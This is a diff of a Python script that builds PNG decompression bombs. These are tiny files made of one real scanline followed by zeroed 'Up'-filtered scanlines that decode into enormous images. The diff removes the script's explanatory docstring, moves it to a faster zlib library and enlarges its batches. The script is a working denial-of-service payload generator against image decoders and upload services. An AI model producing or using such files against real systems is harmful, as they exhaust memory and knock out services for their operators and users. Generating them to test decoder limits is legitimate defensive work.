@@ -1,23 +1,8 @@
-#!/usr/bin/env python3
-"""
-PNG Decompression Bomb Generator
-
-Creates a tiny PNG that decodes into a massive image WITHOUT holding
-the full pixel data in memory during creation.
-
-Technique:
-  - First scanline: filter=None + raw pixel bytes
-  - All other scanlines: filter=Up + all zeros (identical to line above)
-  - zlib compresses the repeated zeros to almost nothing
-
-Memory used: ~50 MB max regardless of output image dimensions.
-"""
-
-import zlib
 import struct
 import sys
 import argparse
 import time
+from isal import isal_zlib as zlib
 
 
 def png_chunk(ctype, data):
@@ -27,55 +12,41 @@ def png_chunk(ctype, data):
 
 
 def create_png_bomb(width, height, filename, mode='gray'):
-    """
-    Generate a PNG bomb file.
-
-    mode: 'gray' (1 B/px), 'rgb' (3 B/px), 'rgba' (4 B/px)
-    """
     color_type, bpp = {'gray': (0, 1), 'rgb': (2, 3), 'rgba': (6, 4)}[mode]
-
-    # ── IHDR ──
     ihdr = struct.pack('>IIBBBBB', width, height, 8, color_type, 0, 0, 0)
 
-    # ── Compress scanlines incrementally ──
-    comp = zlib.compressobj(1, zlib.DEFLATED, 15)
-    line_len = 1 + width * bpp          # filter byte + pixel data
+    comp = zlib.compressobj(3, zlib.DEFLATED, 15)
+    line_len = 1 + width * bpp
 
-    # First line: filter=0 (None), pixels = 0x80 (mid-gray)
     first_line = b'\x00' + bytes([0x80] * (width * bpp))
+    up_line = b'\x02' + b'\x00' * (width * bpp)  # bytes() уже нули
 
-    # All other lines: filter=2 (Up), diffs = 0 (same as line above)
-    up_line = b'\x02' + bytes(width * bpp)
+    # Пишем сжатые данные напрямую в буфер, без накопления списка
+    compressed_parts = []
+    compressed_parts.append(comp.compress(first_line))
 
-    # Batch size: keep under 50 MB of RAM
-    batch_count = max(1, min(height - 1, (1000 * 1024 * 1024) // max(line_len, 1)))
-    print(batch_count)
-    parts = [comp.compress(first_line)]
+    MAX_BATCH_BYTES = 100 * 1024 * 1024
+    batch_count = max(1, MAX_BATCH_BYTES // line_len)
+
+    up_batch = up_line * batch_count
 
     remaining = height - 1
+    while remaining >= batch_count:
+        compressed_parts.append(comp.compress(up_batch))
+        remaining -= batch_count
+        print(remaining)
+
     if remaining > 0:
-        up_batch = up_line * batch_count        # allocate once, reuse
+        compressed_parts.append(comp.compress(up_line * remaining))
 
-        while remaining >= batch_count:
-            parts.append(comp.compress(up_batch))
-            remaining -= batch_count
-            print(remaining)
+    compressed_parts.append(comp.flush())
+    compressed = b''.join(compressed_parts)  # теперь только сжатые данные — малый объём
 
-        if remaining > 0:
-            parts.append(comp.compress(up_line * remaining))
-
-    parts.append(comp.flush())
-    compressed = b''.join(parts)
-
-    # ── Write PNG file ──
     with open(filename, 'wb') as f:
-        f.write(b'\x89PNG\r\n\x1a\n')          # Signature
+        f.write(b'\x89PNG\r\n\x1a\n')
         f.write(png_chunk(b'IHDR', ihdr))
         f.write(png_chunk(b'IDAT', compressed))
         f.write(png_chunk(b'IEND', b''))
-
-    return 8 + 25 + (12 + len(compressed)) + 12   # exact file size
-
 
 def human(n):
     for u in ['B', 'KB', 'MB', 'GB', 'TB', 'PB']:
